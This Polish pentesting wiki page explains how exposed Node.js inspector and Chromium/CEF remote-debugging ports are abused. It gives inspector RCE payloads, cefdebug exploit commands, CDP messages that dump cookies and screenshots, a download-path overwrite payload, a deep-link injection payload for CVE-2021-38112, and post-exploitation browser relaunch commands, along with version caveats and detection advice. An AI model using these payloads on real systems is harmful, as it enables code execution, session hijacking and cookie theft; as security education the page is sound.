# Nadużycie debuggera Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Przykłady historycznych zastosowań obejmują walkthrough Multimaster oraz atak debuggerem Visual Studio Code z CVE-2019-1414; należy traktować je jako kontekst specyficzny dla danej wersji, a nie zakładać, że każdy obecny cel Electron lub Chromium udostępnia te same prymitywy.<sup>[[1]](#references)[[3]](#references)</sup>

## Podstawowe informacje

[Z dokumentacji](https://nodejs.org/learn/getting-started/debugging): Po uruchomieniu z przełącznikiem `--inspect` proces Node.js nasłuchuje na połączenia klienta debuggera. **Domyślnie** nasłuchuje na hoście i porcie **`127.0.0.1:9229`**. Każdy proces otrzymuje również **unikatowy** **UUID**.<sup>[[4]](#references)</sup>

Klienci Inspector muszą znać i podać adres hosta, port oraz UUID, aby nawiązać połączenie. Pełny URL będzie wyglądał mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Ponieważ **debugger ma pełny dostęp do środowiska wykonawczego Node.js**, złośliwy aktor mogący połączyć się z tym portem może być w stanie wykonać dowolny kod w imieniu procesu Node.js (**potencjalna eskalacja uprawnień**).<sup>[[4]](#references)</sup>

Inspector można uruchomić na kilka sposobów:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Po uruchomieniu procesu poddawanego inspekcji pojawi się coś takiego:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Procesy oparte na **CEF** (**Chromium Embedded Framework**) mogą udostępniać debugger za pomocą `--remote-debugging-port=9222`. Udostępnia on przeglądarkę przez [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a nie inspektor Node.js, dlatego payloady oparte na `process` Node.js domyślnie nie mają tu bezpośredniego zastosowania.<sup>[[2]](#references)[[5]](#references)</sup>

Po uruchomieniu przeglądarki w trybie debugowania pojawi się coś takiego:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Wyliczanie i obsługa endpointu CDP

Endpointy wykrywania HTTP rozróżniają WebSocket **przeglądarki** od WebSocketów poszczególnych **celów** (kart, workerów, rozszerzeń itp.). Odpytaj `/json/version`, aby uzyskać endpoint przeglądarki, a `/json/list`, aby uzyskać cele; zwrócone wartości `webSocketDebuggerUrl` można następnie obsługiwać bezpośrednio za pomocą komunikatów podobnych do JSON-RPC w CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Na przykład połącz się przez `websocat "$BROWSER_WS"` i wyślij `{"id":1,"method":"Target.getTargets"}` lub `{"id":2,"method":"Storage.getCookies"}`. Na page target (`websocat "$PAGE_WS"`) `Runtime.evaluate` wykonuje kod w rendererze, a `Page.captureScreenshot` zwraca zrzut ekranu zakodowany w base64. `document.cookie` nie może ujawnić ciasteczek `HttpOnly`, natomiast `Storage.getCookies` pobiera ciasteczka z magazynu przeglądarki.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Przeglądarki, WebSockets i polityka same-origin <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w przeglądarce mogą wysyłać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest niezbędne, aby **uzyskać unikalny identyfikator sesji debuggera**. **Polityka same-origin** **uniemożliwia** stronom internetowym nawiązanie **tego połączenia HTTP**. Dodatkowo, aby zabezpieczyć się przed [**atakami DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js sprawdza, czy **nagłówki „Host”** połączenia zawierają dokładnie **adres IP** lub **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Te **środki bezpieczeństwa uniemożliwiają wykorzystanie inspectora** do uruchomienia kodu przez **samo wysłanie żądania HTTP** (co można zrobić, wykorzystując podatność SSRF).<sup>[[4]](#references)</sup>

### Uruchamianie inspectora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu nodejs, aby **uruchomić w nim inspector** na domyślnym porcie. Pamiętaj jednak, że potrzebujesz odpowiednich uprawnień, więc może to zapewnić **uprzywilejowany dostęp do informacji wewnątrz procesu**, ale nie bezpośrednią eskalację uprawnień.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Jest to przydatne w kontenerach, ponieważ **zatrzymanie procesu i uruchomienie nowego** z `--inspect` **nie wchodzi w grę**, gdyż **kontener** zostanie **zakończony** razem z procesem.<sup>[[6]](#references)</sup>

### Połącz się z inspector/debugger

Aby połączyć się z **przeglądarką opartą na Chromium**, można otworzyć adres `chrome://inspect` lub `edge://inspect`, odpowiednio dla Chrome lub Edge. Po kliknięciu przycisku Configure należy upewnić się, że na liście widnieje prawidłowy **host i port docelowy**. Obraz przedstawia przykład Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Pojawi się adres URL umożliwiający dostęp do debuggera, np. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Połącz się z inspector/debugger: Aby połączyć się z przeglądarką opartą na Chromium, ...](<../../images/image (674).png>)

Z debuggerem/inspectorem można połączyć się za pomocą **wiersza poleceń**:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) pozwala **znajdować inspektory** działające lokalnie i **wstrzykiwać do nich kod**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Pamiętaj, że **exploity NodeJS RCE nie zadziałają**, jeśli połączysz się z przeglądarką przez [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (musisz sprawdzić API, aby znaleźć ciekawe sposoby jego wykorzystania).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE w debuggerze/inspektorze NodeJS

> [!TIP]
> Jeśli szukasz informacji, jak uzyskać [**RCE z XSS w Electron, sprawdź tę stronę.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Niektóre popularne sposoby uzyskania **RCE**, gdy możesz **połączyć się** z inspektorem Node, polegają na użyciu czegoś takiego (wygląda na to, że **nie zadziała to w przypadku połączenia z Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Ładunki protokołu Chrome DevTools

API można sprawdzić tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
W tej sekcji wymienię tylko interesujące zastosowania tego protokołu do exploitacji, na które natrafiłem.

### Chrome 136+ — ograniczenie dotyczące profilu domyślnego

Począwszy od **Chrome 136**, Chrome ignoruje `--remote-debugging-port` i `--remote-debugging-pipe`, gdy są używane z **domyślnym katalogiem danych Chrome**. Przełącznik musi być użyty wraz z niestandardowym `--user-data-dir`. Oddzielny klucz szyfrowania i odizolowany stan przeglądarki zapobiegają ujawnieniu zwykłego, uwierzytelnionego profilu użytkownika za pomocą prostej techniki opartej na fladze. Nie należy zakładać, że to ograniczenie specyficzne dla Chrome obejmuje starsze wersje Chrome, Chrome for Testing, aplikacje Electron/CEF ani inne odmiany Chromium — należy to zweryfikować.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Dlatego samo stwierdzenie, że uruchomiony proces Chrome ma flagę `--remote-debugging-port`, **nie** dowodzi, że CDP stało się aktywne. Potwierdź działanie listenera i endpointu `/json/version`, a także ustal, który profil jest z nim powiązany.<sup>[[14]](#references)</sup>

### Wstrzykiwanie parametrów za pomocą deep linków

W [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) badacze z Rhino Security odkryli, że aplikacja oparta na CEF **zarejestrowała w systemie własny URI** (`workspaces://index.html`), który otrzymywał pełny URI, a następnie **uruchamiał aplikację opartą na CEF** z konfiguracją częściowo skonstruowaną na jego podstawie.<sup>[[8]](#references)</sup>

Odkryto, że parametry URI były dekodowane z formatu URL i używane do uruchomienia podstawowej aplikacji CEF, co pozwalało użytkownikowi **wstrzyknąć** flagę **`--gpu-launcher`** do **wiersza poleceń** i wykonywać dowolne polecenia.<sup>[[8]](#references)</sup>

A zatem ładunek taki jak:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Uruchomi plik calc.exe.<sup>[[8]](#references)</sup>

### Nadpisywanie plików

Zmień folder, w którym będą zapisywane **pobrane pliki**, i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE i eksfiltracja

STAR Labs wykazało, że ujawnione usługi WebDriver/CDP mogą umożliwiać odczyt dowolnych plików i RCE; w niektórych konfiguracjach DNS rebinding może dopełnić łańcuch exploita.<sup>[[9]](#references)</sup>

Usługa WebDriver ChromeDrivera różni się od Chrome DevTools/CDP. Jej capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) wskazuje plik wykonywalny przeglądarki uruchamiany dla nowej sesji. Jeśli nieuprzywilejowany użytkownik może uzyskać dostęp do usługi ChromeDriver działającej jako root i przesłać sesję ze ścieżką do pliku wykonywalnego kontrolowaną przez użytkownika, takie uruchomienie może przekroczyć granicę uprawnień usługi. Pusta odpowiedź `/sessions` nie przesądza o tym, czy można tworzyć nowe sesje. Zanim uznasz, że ta ścieżka jest użyteczna, sprawdź właściciela procesu, rzeczywistą dostępność listenera, autoryzację sesji, dostęp do pliku wykonywalnego i ograniczenia. Sama nazwa procesu lub typowy port nie wystarczą. [Wytyczne bezpieczeństwa Google](https://developer.chrome.com/docs/chromedriver/security-considerations) zalecają uruchamianie ChromeDrivera na nieuprzywilejowanym koncie. Pasywne rozpoznanie nie powinno tworzyć sesji WebDriver.

Więcej historycznych przypadków związanych z automatyzacją przeglądarek i bezpieczeństwem Chromium opisano w materiale Counter WebDriver oraz w zgłoszeniach Project Zero 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Włączanie CDP w działającym procesie Chromium

W systemie Windows [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) pokazał, że ograniczenia dotyczące wiersza poleceń nie są jedynym sposobem aktywacji CDP: kod, który potrafi już wstrzykiwać się do istniejącego procesu `msedge.exe`, może wywołać nieeksportowaną funkcję Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` i udostępnić uwierzytelniony, aktywny profil bez ponownego uruchamiania przeglądarki.<sup>[[15]](#references)</sup>

W przedstawionym łańcuchu DLL jest wstrzykiwany za pomocą `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, rozwiązywane są wewnętrzne symbole Edge (najpierw z plików PDB, a następnie przy użyciu sygnatur bajtowych zależnych od wersji), podklasowane jest okno przeglądarki, a następnie wysyłana jest wiadomość, aby końcowe wywołanie uruchamiające serwer wykonało się w wątku **UI** przeglądarki. Gniazdo jest powiązane z loopbackiem. Następnie standardowe funkcje CDP mogą pobierać cookies, przechwytywać karty, analizować ruch sieciowy lub wykonywać JavaScript na uwierzytelnionych stronach.<sup>[[15]](#references)</sup>

> [!WARNING]
> Jest to technika **post-compromise/injection procesu**, a nie obejście uwierzytelniania przez sieć. Jest silnie zależna od kompilacji, ponieważ odpowiednie symbole C++ nie są eksportowane, a sygnatury mogą się zmieniać po aktualizacjach przeglądarki.<sup>[[15]](#references)</sup>

Wykrywając tę technikę, nie polegaj wyłącznie na telemetrii wiersza poleceń `--remote-debugging-*`: koreluj także nietypowe uchwyty i operacje na pamięci względem procesów przeglądarki (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, tworzenie wątków), wstrzykiwanie DLL oraz nieoczekiwane nasłuchujące gniazda loopback należące do Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

W rzeczywistym środowisku, **po skompromitowaniu** komputera użytkownika korzystającego z przeglądarki opartej na Chromium, historyczna technika polegała na ponownym uruchomieniu przeglądarki z włączonym debugowaniem i przekierowaniu portu loopback. Może to ujawnić stan przeglądania ofiary w produktach/kompilacjach, które nadal akceptują wybrany profil, ale Chrome 136+ nie zastosuje tej metody do domyślnego katalogu danych.<sup>[[7]](#references)[[14]](#references)</sup>

Oryginalne polecenie ponownego uruchomienia zachowano poniżej dla starszych celów/zależnych od wersji. Drugie polecenie to obsługiwana forma dla obecnego Chrome, ale tworzy odizolowany profil zamiast ponownie otwierać zwykły, uwierzytelniony stan ofiary.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

W przypadku specyficznych dla macOS technik relaunch, rozszerzeń i CDP w Chromium zobacz [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - narzędzie do inspekcji i wykorzystywania debuggera CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: zdalne wykonanie kodu w Visual Studio Code za pośrednictwem debuggera Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Przewodnik debugowania Node.js - wprowadzenie](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: nadużywanie funkcji debugowania Chrome do zdalnego obserwowania i kontrolowania sesji przeglądania](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: zdalne wykonanie kodu w AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Rozmawiasz ze mną? - RCE w WebDriver za pośrednictwem DNS Rebinding i CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - od bota do RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (moduł śledzenia błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (moduł śledzenia błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (moduł śledzenia błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Zmiany przełączników zdalnego debugowania w celu poprawy bezpieczeństwa - Chrome dla deweloperów](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Wstrzykiwanie CDP do uruchomionej przeglądarki Edge: dogłębna analiza instrumentacji przeglądarki w czasie działania](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
